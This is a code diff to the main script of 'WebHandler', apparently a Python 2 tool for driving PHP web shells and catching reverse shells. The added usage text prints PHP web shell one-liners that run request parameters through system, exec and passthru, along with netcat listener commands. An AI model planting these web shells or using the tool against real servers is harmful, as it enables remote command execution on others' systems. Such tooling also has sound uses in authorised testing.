@@ -26,35 +26,49 @@ Developers:
 '''
 
 # Importing modules
+from sys import argv
 from platform import platform as OS
 
-from modules.info import info
 from core.libs.executer import commander
 from core.libs.listen_handler import listen
-from core.libs.menu import getargs, banner
+from core.libs.menu import getargs
+from core.libs.banner import banner
 from core.libs.update import update
-from core.libs.thirdparty.termcolor import cprint as colorize
+from core.libs.thirdparty.termcolor import cprint, colored
 
-# Check for arguments dependencies
-if getargs.url:
-    if getargs.method == 'post' and not getargs.parameter:
-        errmsg = '\n[!] Using post method requires --parameter flag, check help'
-        exit(colorize(errmsg, 'red'))
-    elif getargs.method == 'get' and getargs.parameter:
-        errmsg = '\n[!] Using get method doesn\'t require --parameter flag, check help'
-        exit(colorize(errmsg, 'red'))
-    else:
-        print banner                                            # Print the banner
-        print info.get_information()                            # Call get_information and print info
-        commander.BackConnect()                                 # Call BackConnect method to handle input
 
-elif getargs.listen:
-    if 'windows' in OS().lower():
-        errmsg = '[!] WebHandler doesn\'t support Windows OS yet, '
-        errmsg += 'still working on it.'
-        exit(colorize(errmsg, 'red'))
-    else:
-        listen.wait_connection()                                # Call wait_connection to wait for a connection
+if len(argv) <= 1:
+    cprint("-- Hanlder for PHP system functions & alternative 'netcat listener' --\n", 'blue')
+    cprint("--   Which works for POST and GET requests:    --", 'blue')
+    cprint("1-   <?php system($_GET['parameter']); ?>", 'yellow')
+    cprint("2-   <?php exec($_POST['parameter']); ?>", 'yellow')
+    cprint("3-   <?php passthru($_REQUEST['parameter']); ?>\n", 'yellow')
+    cprint("--   Alternative 'netcat listener'    --", 'blue')
+    cprint("1-   netcat -l -p 1234", 'yellow')
+    cprint("2-   nc -lvvp 4321\n", 'yellow')
+    print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help"
+    exit(1)
 
-elif getargs.update:
-    update()                                                    # Update the script
+else:
+    # Check for arguments dependencies
+    if getargs.url:
+        if getargs.method == 'post' and not getargs.parameter:
+            errmsg = '\n[!] Using post method requires --parameter flag, check help'
+            exit(cprint(errmsg, 'red'))
+        elif getargs.method == 'get' and getargs.parameter:
+            errmsg = '\n[!] Using get method doesn\'t require --parameter flag, check help'
+            exit(cprint(errmsg, 'red'))
+        else:
+            print banner                                            # Print the banner
+            commander.BackConnect()                                 # Call BackConnect method to handle input
+
+    elif getargs.listen:
+        if 'windows' in OS().lower():
+            errmsg = '[!] WebHandler doesn\'t support Windows OS yet, '
+            errmsg += 'still working on it.'
+            exit(cprint(errmsg, 'red'))
+        else:
+            listen.wait_connection()                                # Call wait_connection to wait for a connection
+
+    elif getargs.update:
+        update()                                                    # Update the script
